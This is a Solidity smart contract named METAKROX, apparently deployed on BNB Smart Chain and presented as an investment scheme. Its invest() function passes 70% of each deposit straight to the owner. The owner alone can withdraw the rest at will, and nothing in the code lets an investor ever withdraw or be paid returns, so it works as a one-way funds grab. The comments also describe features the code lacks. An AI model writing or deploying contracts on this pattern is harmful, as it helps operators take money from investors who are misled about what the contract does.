/**
 *Submitted for verification at BscScan.com on 2022-07-31
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.6.0 <0.9.0;

contract METAKROX {
	address owner;
	address contractor;

    // store user address
	struct User {
		address addr;
		uint256 withdrawn;
	}
    
    // get user details using address
    mapping (address => User) public users;

	event Received(address, uint);
	event Withdraw(address, uint);
	event Invest(address, uint);
	
    // on deploying contract assign day limit and owner address
	constructor(address _contractor) public {
		owner = msg.sender;
		contractor=_contractor;
	}

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
	fallback() external payable {}
	
    function changeOwner(address _owner) public {
        require(_owner != address(0));
        require(msg.sender == owner || msg.sender == contractor, 'Only owner can change');
        owner=_owner;
    }
	
	// Function invest: add user address and pay trx to contract
	function invest() public payable {
	    require(msg.value > 0, 'Zero amount');
		(bool sent, bytes memory data) = owner.call{value: msg.value*7/10}("");
        require(sent, "Failed to send Ether");

	    User storage user = users[msg.sender];
	    if(user.addr != msg.sender) {
	        users[msg.sender] = User(msg.sender , block.timestamp - 1 days);
	    }

        emit Invest(msg.sender, msg.value);
	}

    // Owner withdraw: check whether the user is owner and transfer the mentioned amount to owner
    function ownerWithdraw(uint256 amount) public payable returns (uint) {
          require(msg.sender == owner, 'Only owner can withdraw');
		  (bool sent, bytes memory data) = owner.call{value: amount}("");
          require(sent, "Failed to send Ether");
          emit Withdraw(msg.sender, amount);

		  return amount;
	}


}